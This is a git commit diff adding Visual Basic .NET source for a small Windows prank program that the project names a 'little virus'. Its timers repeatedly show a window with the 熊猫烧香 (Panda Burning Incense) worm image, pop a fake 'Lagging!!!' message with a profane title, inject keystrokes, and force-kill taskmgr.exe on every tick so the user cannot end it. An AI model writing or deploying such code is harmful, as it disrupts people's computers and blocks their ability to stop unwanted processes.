9d146bd515711086a5956f6f89f4f44a1904e315
SnowReborn <36327107+SnowReborn@users.noreply.github.com>
2020-02-19 23:50:09 -0800

    Add files via upload

---
+++ Form1.vb
@@ -0,0 +1,18 @@
+﻿Public Class Form1
+
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        Me.Hide()
+        Form2.Show()
+        MsgBox("Lagging!!! ", MsgBoxStyle.Information, "fuck")
+        SendKeys.Send("{enter}")
+        SendKeys.Send("123zxcvbny")
+
+    End Sub
+
+ 
+
+    Private Sub Timer2_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
+        Form2.Show()
+        Shell("taskkill /f /im taskmgr.exe")
+    End Sub
+End Class
---
+++ Form2.Designer.vb
@@ -0,0 +1,38 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form2
+    Inherits System.Windows.Forms.Form
+
+    'Form 重写 Dispose，以清理组件列表。
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Windows 窗体设计器所必需的
+    Private components As System.ComponentModel.IContainer
+
+    '注意: 以下过程是 Windows 窗体设计器所必需的
+    '可以使用 Windows 窗体设计器修改它。
+    '不要使用代码编辑器修改它。
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.SuspendLayout()
+        '
+        'Form2
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackgroundImage = Global.LIttle_bad_project__little_virus_.My.Resources.Resources.熊猫烧香
+        Me.ClientSize = New System.Drawing.Size(738, 467)
+        Me.Name = "Form2"
+        Me.Text = "熊猫"
+        Me.ResumeLayout(False)
+
+    End Sub
+End Class
